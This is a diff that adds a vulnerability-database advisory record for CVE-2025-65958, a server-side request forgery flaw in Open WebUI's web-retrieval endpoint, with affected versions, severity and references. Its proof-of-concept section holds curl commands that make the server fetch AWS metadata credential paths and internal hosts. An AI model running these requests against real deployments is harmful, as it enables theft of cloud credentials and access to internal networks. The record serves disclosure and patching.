@@ -1,0 +1,272 @@
+advisory_id: GHSA-c6xv-rcvw-v685
+datasource_id: github_osv/GHSA-c6xv-rcvw-v685
+datasource_url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-c6xv-rcvw-v685/GHSA-c6xv-rcvw-v685.json
+aliases:
+  - CVE-2025-65958
+summary: |
+  Open WebUI vulnerable to Server-Side Request Forgery (SSRF) via Arbitrary URL Processing in /api/v1/retrieval/process/web
+  ### Summary
+  A Server-Side Request Forgery (SSRF) vulnerability in Open WebUI allows any authenticated user to force the server to make HTTP requests to arbitrary URLs. This can be exploited to access cloud metadata endpoints (AWS/GCP/Azure), scan internal networks, access internal services behind firewalls, and exfiltrate sensitive information. No special permissions beyond basic authentication are required.
+
+
+  ### Details
+  The vulnerability exists in the /api/v1/retrieval/process/web endpoint located in backend/open_webui/routers/retrieval.py at lines 1758-1767.
+
+    Vulnerable code:
+    @router.post("/process/web")
+    def process_web(
+        request: Request, form_data: ProcessUrlForm, user=Depends(get_verified_user)
+    ):
+        try:
+            collection_name = form_data.collection_name
+            if not collection_name:
+                collection_name = calculate_sha256_string(form_data.url)[:63]
+
+            content, docs = get_content_from_url(request, form_data.url)  # ← SSRF vulnerability
+
+  The form_data.url parameter is passed directly to get_content_from_url() without any validation. This function chain ultimately calls web loaders that fetch arbitrary URLs:
+
+    Call chain:
+    1. retrieval.py:1767 → get_content_from_url(request, form_data.url)
+    2. retrieval/utils.py:77 → get_loader(request, url)
+    3. retrieval/utils.py:62 → get_web_loader(url, ...) or YoutubeLoader(url, ...)
+    4. Both loaders fetch the user-supplied URL without validation
+
+    No validation is performed for:
+    - Private IP ranges (RFC1918: 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16)
+    - Localhost addresses (127.0.0.0/8)
+    - Cloud metadata endpoints (169.254.169.254, fd00:ec2::254)
+    - Protocol restrictions (file://, gopher://, etc.)
+    - Domain allowlisting
+
+
+  ### PoC
+  Prerequisites: Valid user account (any role)
+
+    Step 1 - Authenticate:
+    TOKEN=$(curl -s "http://localhost:3000/api/v1/auths/signin" \
+      -H 'Content-Type: application/json' \
+      -d '{"email":"user@example.com","password":"password"}' \
+      | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")
+
+    Step 2 - Basic SSRF Test (external URL):
+    curl -s "http://localhost:3000/api/v1/retrieval/process/web" \
+      -H "Authorization: Bearer $TOKEN" \
+      -H 'Content-Type: application/json' \
+      -d '{"url":"http://example.com"}'
+
+    Result: Server fetches example.com and returns its content, proving the vulnerability.
+
+    {
+      "status": true,
+      "file": {
+        "data": {
+          "content": "Example Domain This domain is for use in documentation..."
+        }
+      }
+    }
+
+    Step 3 - Advanced Attack (AWS metadata):
+    curl -s "http://localhost:3000/api/v1/retrieval/process/web" \
+      -H "Authorization: Bearer $TOKEN" \
+      -H 'Content-Type: application/json' \
+      -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}'
+
+    Result: Server exposes cloud credentials if running on AWS/GCP/Azure.
+
+    Other attack examples:
+    - Internal network: {"url":"http://192.168.1.1"}
+    - Localhost services: {"url":"http://localhost:5432"}
+    - Internal APIs: {"url":"http://internal-api.local"}
+
+
+  ### Impact
+  Who is affected: All authenticated users (no special permissions required)
+
+    Attack capabilities:
+
+    1. Cloud Environment Compromise
+      - Steal AWS/GCP/Azure credentials via metadata endpoints
+      - Result: Full cloud account takeover
+    2. Internal Network Access
+      - Bypass firewalls to access internal services (databases, admin panels, APIs)
+      - Port scan and map internal infrastructure
+      - Result: Complete network visibility
+    3. Data Exfiltration
+      - Read internal documentation, configurations, secrets
+      - Access Kubernetes API servers
+      - Result: Credential theft, API key exposure
+impacted_packages:
+  - purl: pkg:pypi/open-webui
+    affected_versions: vers:pypi/<=0.6.36
+    fixed_versions: vers:pypi/0.6.37
+    affected_packages:
+      - pkg:pypi/open-webui@0.1.124
+      - pkg:pypi/open-webui@0.1.125
+      - pkg:pypi/open-webui@0.2.0
+      - pkg:pypi/open-webui@0.2.1
+      - pkg:pypi/open-webui@0.2.2
+      - pkg:pypi/open-webui@0.2.3
+      - pkg:pypi/open-webui@0.2.4
+      - pkg:pypi/open-webui@0.2.5
+      - pkg:pypi/open-webui@0.3.0
+      - pkg:pypi/open-webui@0.3.1
+      - pkg:pypi/open-webui@0.3.2
+      - pkg:pypi/open-webui@0.3.3
+      - pkg:pypi/open-webui@0.3.4
+      - pkg:pypi/open-webui@0.3.5
+      - pkg:pypi/open-webui@0.3.6
+      - pkg:pypi/open-webui@0.3.7
+      - pkg:pypi/open-webui@0.3.8
+      - pkg:pypi/open-webui@0.3.9
+      - pkg:pypi/open-webui@0.3.10
+      - pkg:pypi/open-webui@0.3.12
+      - pkg:pypi/open-webui@0.3.13
+      - pkg:pypi/open-webui@0.3.14
+      - pkg:pypi/open-webui@0.3.15
+      - pkg:pypi/open-webui@0.3.16
+      - pkg:pypi/open-webui@0.3.17.dev2
+      - pkg:pypi/open-webui@0.3.17.dev3
+      - pkg:pypi/open-webui@0.3.17.dev4
+      - pkg:pypi/open-webui@0.3.17.dev5
+      - pkg:pypi/open-webui@0.3.17
+      - pkg:pypi/open-webui@0.3.18
+      - pkg:pypi/open-webui@0.3.19
+      - pkg:pypi/open-webui@0.3.20
+      - pkg:pypi/open-webui@0.3.21
+      - pkg:pypi/open-webui@0.3.22
+      - pkg:pypi/open-webui@0.3.23
+      - pkg:pypi/open-webui@0.3.24
+      - pkg:pypi/open-webui@0.3.25
+      - pkg:pypi/open-webui@0.3.26
+      - pkg:pypi/open-webui@0.3.27.dev1
+      - pkg:pypi/open-webui@0.3.27.dev2
+      - pkg:pypi/open-webui@0.3.27.dev3
+      - pkg:pypi/open-webui@0.3.27
+      - pkg:pypi/open-webui@0.3.28
+      - pkg:pypi/open-webui@0.3.29
+      - pkg:pypi/open-webui@0.3.30.dev1
+      - pkg:pypi/open-webui@0.3.30.dev2
+      - pkg:pypi/open-webui@0.3.30
+      - pkg:pypi/open-webui@0.3.31.dev1
+      - pkg:pypi/open-webui@0.3.31
+      - pkg:pypi/open-webui@0.3.32
+      - pkg:pypi/open-webui@0.3.33.dev1
+      - pkg:pypi/open-webui@0.3.33
+      - pkg:pypi/open-webui@0.3.34
+      - pkg:pypi/open-webui@0.3.35
+      - pkg:pypi/open-webui@0.4.0.dev1
+      - pkg:pypi/open-webui@0.4.0.dev2
+      - pkg:pypi/open-webui@0.4.0
+      - pkg:pypi/open-webui@0.4.1
+      - pkg:pypi/open-webui@0.4.2
+      - pkg:pypi/open-webui@0.4.3
+      - pkg:pypi/open-webui@0.4.4
+      - pkg:pypi/open-webui@0.4.5
+      - pkg:pypi/open-webui@0.4.6.dev1
+      - pkg:pypi/open-webui@0.4.6
+      - pkg:pypi/open-webui@0.4.7
+      - pkg:pypi/open-webui@0.4.8
+      - pkg:pypi/open-webui@0.5.0.dev1
+      - pkg:pypi/open-webui@0.5.0.dev2
+      - pkg:pypi/open-webui@0.5.0
+      - pkg:pypi/open-webui@0.5.1
+      - pkg:pypi/open-webui@0.5.2
+      - pkg:pypi/open-webui@0.5.3.dev1
+      - pkg:pypi/open-webui@0.5.3
+      - pkg:pypi/open-webui@0.5.4
+      - pkg:pypi/open-webui@0.5.5
+      - pkg:pypi/open-webui@0.5.6
+      - pkg:pypi/open-webui@0.5.7
+      - pkg:pypi/open-webui@0.5.8
+      - pkg:pypi/open-webui@0.5.9
+      - pkg:pypi/open-webui@0.5.10
+      - pkg:pypi/open-webui@0.5.11
+      - pkg:pypi/open-webui@0.5.12
+      - pkg:pypi/open-webui@0.5.13
+      - pkg:pypi/open-webui@0.5.14
+      - pkg:pypi/open-webui@0.5.15
+      - pkg:pypi/open-webui@0.5.16
+      - pkg:pypi/open-webui@0.5.17
+      - pkg:pypi/open-webui@0.5.18
+      - pkg:pypi/open-webui@0.5.19
+      - pkg:pypi/open-webui@0.5.20
+      - pkg:pypi/open-webui@0.6.0
+      - pkg:pypi/open-webui@0.6.1
+      - pkg:pypi/open-webui@0.6.2
+      - pkg:pypi/open-webui@0.6.3
+      - pkg:pypi/open-webui@0.6.4
+      - pkg:pypi/open-webui@0.6.5
+      - pkg:pypi/open-webui@0.6.6.dev1
+      - pkg:pypi/open-webui@0.6.6
+      - pkg:pypi/open-webui@0.6.7
+      - pkg:pypi/open-webui@0.6.8
+      - pkg:pypi/open-webui@0.6.9
+      - pkg:pypi/open-webui@0.6.10
+      - pkg:pypi/open-webui@0.6.11
+      - pkg:pypi/open-webui@0.6.12
+      - pkg:pypi/open-webui@0.6.13
+      - pkg:pypi/open-webui@0.6.14
+      - pkg:pypi/open-webui@0.6.15
+      - pkg:pypi/open-webui@0.6.16
+      - pkg:pypi/open-webui@0.6.18
+      - pkg:pypi/open-webui@0.6.19
+      - pkg:pypi/open-webui@0.6.20
+      - pkg:pypi/open-webui@0.6.21
+      - pkg:pypi/open-webui@0.6.22
+      - pkg:pypi/open-webui@0.6.23
+      - pkg:pypi/open-webui@0.6.24
+      - pkg:pypi/open-webui@0.6.25
+      - pkg:pypi/open-webui@0.6.26.dev1
+      - pkg:pypi/open-webui@0.6.26
+      - pkg:pypi/open-webui@0.6.27
+      - pkg:pypi/open-webui@0.6.28
+      - pkg:pypi/open-webui@0.6.29
+      - pkg:pypi/open-webui@0.6.30
+      - pkg:pypi/open-webui@0.6.31
+      - pkg:pypi/open-webui@0.6.32
+      - pkg:pypi/open-webui@0.6.33
+      - pkg:pypi/open-webui@0.6.34
+      - pkg:pypi/open-webui@0.6.35
+      - pkg:pypi/open-webui@0.6.36
+    fixed_packages:
+      - pkg:pypi/open-webui@0.6.37
+    fixed_in_commits: []
+    introduced_in_commits: []
+  - purl: pkg:github/open-webui/open-webui
+    affected_versions:
+    fixed_versions:
+    affected_packages: []
+    fixed_packages: []
+    fixed_in_commits:
+      - vcs_url: https://github.com/open-webui/open-webui
+        commit: 02238d3113e966c353fce18f1b65117380896774
+        patch_text:
+    introduced_in_commits: []
+severities:
+  - score: '8.5'
+    scoring_system: cvssv3.1
+    scoring_elements: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:L/A:N
+    published_at:
+    url: https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2025/12/GHSA-c6xv-rcvw-v685/GHSA-c6xv-rcvw-v685.json
+  - score: HIGH
+    scoring_system: generic_textual
+    scoring_elements:
+    published_at:
+    url:
+weaknesses:
+  - CWE-918
+references:
+  - url: https://github.com/open-webui/open-webui
+    reference_type:
+    reference_id:
+  - url: https://github.com/open-webui/open-webui/commit/02238d3113e966c353fce18f1b65117380896774
+    reference_type:
+    reference_id:
+  - url: https://nvd.nist.gov/vuln/detail/CVE-2025-65958
+    reference_type:
+    reference_id: CVE-2025-65958
+  - url: https://github.com/open-webui/open-webui/security/advisories/GHSA-c6xv-rcvw-v685
+    reference_type:
+    reference_id: GHSA-c6xv-rcvw-v685
+exploits: []
